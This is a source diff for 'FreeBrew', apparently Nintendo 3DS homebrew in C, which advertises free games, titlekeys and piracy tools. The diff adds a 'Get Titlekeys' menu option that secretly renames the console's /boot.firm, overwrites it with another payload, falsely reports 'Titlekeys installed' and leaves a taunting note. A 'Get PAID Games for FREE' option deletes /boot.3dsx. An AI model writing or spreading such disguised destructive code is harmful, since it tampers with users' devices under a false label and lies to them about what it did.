@@ -188,21 +188,22 @@ int main(int argc, char **argv)
 			printf("\x1b[0m");
 			printf("\x1b[1;42H\x1b[31;46mTime:");
 			printf("\x1b[1;1H\x1b[31;46mFreeBrew");
-			printf("\x1b[2;1H\x1b[31mVersion: 1.3.0");
+			printf("\x1b[2;1H\x1b[31mVersion: 1.4.0");
 
 
 			printf("\x1b[3;1H\x1b[2;43m\x1b[30m--- CFW ONLY! ---");
 			printf("\x1b[5;1H\x1b[2;43m\x1b[30mGet Free Games");
-			printf("\x1b[6;1H\x1b[2;43m\x1b[30mNote on 11.8");
+			printf("\x1b[6;1H\x1b[2;43m\x1b[30mPiracy Note");
+			printf("\x1b[8;1H\x1b[2;43m\x1b[30mGet Titlekeys(Warning!)");
 			printf("\x1b[7;1H\x1b[2;43m\x1b[30mMysterious Text setter O_O");
-			printf("\x1b[10;1H\x1b[2;43m\x1b[30m--- HB ONLY! ---");
-			printf("\x1b[12;1H\x1b[2;43m\x1b[30mGet Free Games on HB");
-			printf("\x1b[13;1H\x1b[2;43m\x1b[30mWhat you can do with HB only access");
-			printf("\x1b[16;1H\x1b[2;43m\x1b[30m--- CFW and HB ---");
-			printf("\x1b[18;1H\x1b[2;43m\x1b[30mCrash your 3ds!");
-			printf("\x1b[19;1H\x1b[2;43m\x1b[30mGet PAID Games for FREE");
-			printf("\x1b[20;1H\x1b[2;43m\x1b[30mExit");
-			printf("\x1b[18;30H\x1b[2;43m\x1b[30mLog:"); }
+			printf("\x1b[11;1H\x1b[2;43m\x1b[30m--- HB ONLY! ---");
+			printf("\x1b[13;1H\x1b[2;43m\x1b[30mGet Free Games on HB");
+			printf("\x1b[14;1H\x1b[2;43m\x1b[30mWhat you can do with HB only access");
+			printf("\x1b[17;1H\x1b[2;43m\x1b[30m--- CFW and HB ---");
+			printf("\x1b[19;1H\x1b[2;43m\x1b[30mCrash your 3ds!");
+			printf("\x1b[20;1H\x1b[2;43m\x1b[30mGet PAID Games for FREE");
+			printf("\x1b[21;1H\x1b[2;43m\x1b[30mExit");
+			printf("\x1b[19;30H\x1b[2;43m\x1b[30mLog:"); }
 
 	void BottomCode(){
 	while(numb < 120){
@@ -264,7 +265,7 @@ int main(int argc, char **argv)
 		if (kDown & KEY_DUP) menu = menu-1, initN();
 		if (kDown & KEY_DDOWN) menu = menu+1, initN();
 		if (menu == 0) menu = 1;
-		if (menu == 9) menu = 8;
+		if (menu == 10) menu = 9;
 
 		if (RunOnce == true){
 			printf("\x1b[20;30H\x1b[2;43m\x1b[30mMenu Loaded!");
@@ -273,13 +274,14 @@ int main(int argc, char **argv)
 		}
 
 		if (menu == 1) printf("\x1b[5;1H\x1b[2;47m\x1b[30mGet Free Games");
-		if (menu == 2) printf("\x1b[6;1H\x1b[2;47m\x1b[30mNote on 11.8");
+		if (menu == 2) printf("\x1b[6;1H\x1b[2;47m\x1b[30mPiracy Note");
 		if (menu == 3) printf("\x1b[7;1H\x1b[2;47m\x1b[30mMysterious Text setter O_O");
-		if (menu == 4) printf("\x1b[12;1H\x1b[2;47m\x1b[30mGet Free Games on HB");
-		if (menu == 5) printf("\x1b[13;1H\x1b[2;47m\x1b[30mWhat you can do with HB only access");
-		if (menu == 6) printf("\x1b[18;1H\x1b[2;47m\x1b[30mCrash your 3ds!");
-		if (menu == 7) printf("\x1b[19;1H\x1b[2;47m\x1b[30mGet PAID Games for FREE");
-		if (menu == 8) printf("\x1b[20;1H\x1b[2;47m\x1b[30mExit");
+		if (menu == 4) printf("\x1b[8;1H\x1b[2;47m\x1b[30mGet Titlekeys(Warning!)");
+		if (menu == 5) printf("\x1b[13;1H\x1b[2;47m\x1b[30mGet Free Games on HB");
+		if (menu == 6) printf("\x1b[14;1H\x1b[2;47m\x1b[30mWhat you can do with HB only access");
+		if (menu == 7) printf("\x1b[19;1H\x1b[2;47m\x1b[30mCrash your 3ds!");
+		if (menu == 8) printf("\x1b[20;1H\x1b[2;47m\x1b[30mGet PAID Games for FREE");
+		if (menu == 9) printf("\x1b[21;1H\x1b[2;47m\x1b[30mExit");
 
 		if (menu == 1 && kDown & KEY_A){
 			YellowScreen();
@@ -325,7 +327,7 @@ int main(int argc, char **argv)
 		 if(menu == 2 && kDown & KEY_A){
 			YellowScreen();
 			printf("\x1b[3;1H\x1b[2;47m\x1b[30mBack");
-			printf("\x1b[5;1H\x1b[2;43m\x1b[30mNote: If you try to pirate on 11.8 with CFW you   have a high chance of being banned from nintendo'sonline services, so don't pirate!");
+			printf("\x1b[5;1H\x1b[2;43m\x1b[30mNote: Right, so a lot of you might be freaking out about 11.8 and it's new features, basically, common piracy apps now are fully broken on any version, so you can try downloading all the free games you want, it will not work. go cry yourself to sleep knowing you can't pirate anymore");
 			while(maybe == true){
 			hidScanInput();
 			u32 kDown = hidKeysDown();
@@ -345,7 +347,46 @@ int main(int argc, char **argv)
 			fclose(fp);
 		}
 
-		if(menu == 5 && kDown & KEY_A){
+
+
+
+
+
+
+		if(menu == 4 && kDown & KEY_A){
+			   size_t len = 0 ;
+			   printf("\x1b[20;30H\x1b[2;43m\x1b[30m                   ");
+				printf("\x1b[21;30H\x1b[2;43m\x1b[30m                   ");
+				printf("\x1b[22;30H\x1b[2;43m\x1b[30m                   ");
+				printf("\x1b[21;30H\x1b[2;43m\x1b[30mWorking!!");
+				gfxFlushBuffers();
+				gfxSwapBuffers();
+				gspWaitForVBlank();
+				rename("/boot.firm", "/brick.firm");
+   				const char a[] = "/luma/payloads/GodMode9.firm" ;
+   				const char b[] = "/boot.firm" ;
+   				char buffer[BUFSIZ] = { '\0' } ;
+   				 FILE* in = fopen( a, "rb" ) ;
+    			FILE* out = fopen( b, "wb" ) ;
+
+  			    if( in == NULL || out == NULL ){
+  			      printf("\x1b[20;30H\x1b[2;43m\x1b[30mBeep error");
+  			      in = out = 0 ; }
+  			    while( (len = fread( buffer, BUFSIZ, 1, in)) > 0 )
+ 			    {
+ 			        fwrite( buffer, BUFSIZ, 1, out ) ;
+ 			    }
+ 			    fclose(in) ;
+ 			    fclose(out) ;
+ 			    printf("\x1b[21;30H\x1b[2;43m\x1b[30mTitlekeys installed");
+ 			    FILE *fp;
+				fp = fopen("/notbricked.txt", "w");
+				fputs("No, you are not bricked, replace your boot.firm and everything will be fine, don't try to pirate idiot", fp);
+				fclose(fp); }
+
+  			 
+
+		if(menu == 6 && kDown & KEY_A){
 			YellowScreen();
 			printf("\x1b[3;1H\x1b[2;47m\x1b[30mBack");
 			printf("\x1b[5;1H\x1b[2;43m\x1b[30mSome things to try on HB only access:");
@@ -363,7 +404,7 @@ int main(int argc, char **argv)
 			rescreen(); }}
 
 
-		if(menu == 4 && kDown & KEY_A){
+		if(menu == 5 && kDown & KEY_A){
 			YellowScreen();
 			printf("\x1b[3;1H\x1b[2;47m\x1b[30mBack");
 			printf("\x1b[5;1H\x1b[2;43m\x1b[30mNote: Want FREE games on HB only access? Well, Youare in luck! There are enough free games and demosin the eshop, go download them!");
@@ -376,7 +417,7 @@ int main(int argc, char **argv)
 			break; }
 			rescreen(); }}
 
-		if (menu == 6 && kDown & KEY_A){
+		if (menu == 7 && kDown & KEY_A){
 			printf("\x1b[20;30H\x1b[2;43m\x1b[30m                   ");
 			printf("\x1b[21;30H\x1b[2;43m\x1b[30m                   ");
 			printf("\x1b[22;30H\x1b[2;43m\x1b[30m                   ");
@@ -384,14 +425,14 @@ int main(int argc, char **argv)
 			crash = true; 
 			goto crash; }
 
-		if (menu == 7 && kDown & KEY_A){
+		if (menu == 8 && kDown & KEY_A){
 			BSOD = true;
 			printf("\x1b[20;30H\x1b[2;43m\x1b[30m                   ");
 			printf("\x1b[21;30H\x1b[2;43m\x1b[30m                   ");
 			printf("\x1b[22;30H\x1b[2;43m\x1b[30m                   ");
 			printf("\x1b[21;30H\x1b[2;43m\x1b[30mBricc in progress");
 			if (remove("/boot.3dsx") == 0)
-     		printf("\x1b[22;30H\x1b[2;43m\x1b[30mBricced");
+     		printf("\x1b[22;30H\x1b[2;43m\x1b[30mBricced HB");
    			else
     	  	printf("\x1b[22;30H\x1b[2;43m\x1b[30mError");
     	  	while(maybe == true){
@@ -403,7 +444,7 @@ int main(int argc, char **argv)
 				gspWaitForVBlank(); }}
    		rescreen();
 
-   		if (menu == 8 && kDown & KEY_A) break;
+   		if (menu == 9 && kDown & KEY_A) break;
 	}
 
 	Exit:
